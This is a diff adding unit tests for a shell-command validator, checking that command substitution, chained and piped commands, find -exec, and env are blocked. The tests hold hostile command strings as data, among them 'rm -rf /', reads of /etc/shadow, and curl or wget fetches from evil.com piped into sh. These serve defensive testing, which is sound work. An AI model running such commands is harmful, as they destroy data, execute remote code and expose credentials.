@@ -80,6 +80,128 @@ describe('Privilege validation', () => {
     });
   });
 
+  describe('Shell metacharacter defense (SEC-03)', () => {
+    it('blocks command substitution via $() at Level 0', () => {
+      const result = validateCommand('ls $(rm -rf /)', 0);
+      expect(result.allowed).toBe(false);
+      expect(result.reason).toContain('shell expansion');
+    });
+
+    it('blocks backtick command substitution at Level 0', () => {
+      const result = validateCommand('ls `whoami`', 0);
+      expect(result.allowed).toBe(false);
+      expect(result.reason).toContain('shell expansion');
+    });
+
+    it('blocks $() at Level 1', () => {
+      const config = { allowPatterns: ['ls\\s*'] };
+      const result = validateCommand('ls $(cat /etc/shadow)', 1, config);
+      expect(result.allowed).toBe(false);
+      expect(result.reason).toContain('shell expansion');
+    });
+
+    it('splits chained commands and validates each segment at Level 0', () => {
+      // ls is allowed, curl is not
+      const result = validateCommand('ls; curl http://evil.com', 0);
+      expect(result.allowed).toBe(false);
+      expect(result.reason).toContain('Chained command denied');
+    });
+
+    it('splits && chained commands at Level 0', () => {
+      const result = validateCommand('ls && rm -rf /', 0);
+      expect(result.allowed).toBe(false);
+    });
+
+    it('splits || chained commands at Level 0', () => {
+      const result = validateCommand('cat file || curl evil.com', 0);
+      expect(result.allowed).toBe(false);
+    });
+
+    it('allows chained commands if all segments are valid at Level 0', () => {
+      const result = validateCommand('ls -la && cat file.txt', 0);
+      expect(result.allowed).toBe(true);
+    });
+
+    it('blocks base64 | sh in denylist', () => {
+      expect(validateCommand('base64 -d payload | sh', 2).allowed).toBe(false);
+      expect(validateCommand('base64 -d payload | bash', 2).allowed).toBe(false);
+    });
+
+    it('blocks curl -o file && sh file', () => {
+      expect(validateCommand('curl http://evil.com -o /tmp/x && sh /tmp/x', 2).allowed).toBe(false);
+    });
+
+    it('blocks wget -O file && sh file', () => {
+      expect(validateCommand('wget http://evil.com -O /tmp/x && sh /tmp/x', 2).allowed).toBe(false);
+    });
+  });
+
+  describe('Pipe target validation (BYPASS-02/03)', () => {
+    it('blocks cat piped to bash at Level 0', () => {
+      const result = validateCommand('cat evil.sh | bash', 0);
+      expect(result.allowed).toBe(false);
+      expect(result.reason).toContain('dangerous target');
+    });
+
+    it('blocks cat piped to sh at Level 0', () => {
+      const result = validateCommand('cat script.sh | sh', 0);
+      expect(result.allowed).toBe(false);
+    });
+
+    it('blocks piping to python at Level 0', () => {
+      expect(validateCommand('cat script.py | python3', 0).allowed).toBe(false);
+    });
+
+    it('blocks piping to xargs at Level 0', () => {
+      expect(validateCommand('ls | xargs rm', 0).allowed).toBe(false);
+    });
+
+    it('blocks piping to non-allowlisted command at Level 0', () => {
+      const result = validateCommand('cat file | curl -X POST', 0);
+      expect(result.allowed).toBe(false);
+      expect(result.reason).toContain('Pipe target');
+    });
+
+    it('allows piping between allowlisted commands at Level 0', () => {
+      expect(validateCommand('cat file.txt | grep pattern', 0).allowed).toBe(true);
+      expect(validateCommand('ls -la | head -20', 0).allowed).toBe(true);
+      expect(validateCommand('find . -name "*.ts" | wc -l', 0).allowed).toBe(true);
+    });
+  });
+
+  describe('find -exec blocking (NEW-05)', () => {
+    it('allows find without -exec at Level 0', () => {
+      expect(validateCommand('find . -name "*.ts"', 0).allowed).toBe(true);
+      expect(validateCommand('find /tmp -type f', 0).allowed).toBe(true);
+    });
+
+    it('blocks find -exec at Level 0', () => {
+      const result = validateCommand('find /tmp -exec rm {} \\;', 0);
+      expect(result.allowed).toBe(false);
+      expect(result.reason).toContain('find with -exec');
+    });
+
+    it('blocks find -execdir at Level 0', () => {
+      const result = validateCommand('find . -execdir cat {} \\;', 0);
+      expect(result.allowed).toBe(false);
+      expect(result.reason).toContain('find with -exec');
+    });
+
+    it('blocks find -ok at Level 0', () => {
+      expect(validateCommand('find . -ok rm {} \\;', 0).allowed).toBe(false);
+    });
+  });
+
+  describe('Removed dangerous Level 0 commands', () => {
+    it('denies env command (leaks secrets)', () => {
+      expect(validateCommand('env', 0).allowed).toBe(false);
+    });
+
+    it('denies echo command (shell expansion abuse)', () => {
+      expect(validateCommand('echo hello', 0).allowed).toBe(false);
+    });
+  });
+
   describe('Edge cases', () => {
     it('rejects empty command', () => {
       expect(validateCommand('', 0).allowed).toBe(false);
